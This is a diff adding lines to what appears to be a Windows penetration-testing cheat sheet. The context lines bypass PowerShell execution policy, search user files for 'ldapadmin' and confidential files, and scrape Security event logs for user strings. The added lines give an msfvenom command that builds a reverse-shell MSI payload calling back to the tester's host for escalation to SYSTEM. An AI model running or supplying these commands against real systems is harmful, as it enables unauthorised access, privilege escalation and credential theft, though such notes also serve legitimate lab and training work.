@@ -28,6 +28,9 @@ $ Set-ExecutionPolicy bypass -Scope process
 $ Get-ChildItem -Path C:\Users\ -Recurse -File | Select-String -Pattern 'ldapadmin'
 $ dir C:\ /s /b | findstr /i "confidential.txt"
 
+* If you got the RDP session, Escalate privileges to SYSTEM create msfvenom
+$ msfvenom -p windows/x64/shell_reverse_tcp lhost=yourip lport=9443 -f msi -o aie.msi
+
 * Log Reader
 $ net localgroup "Event Log Readers"
 $ wevtutil qe Security /rd:true /f:text | Select-String "/user"
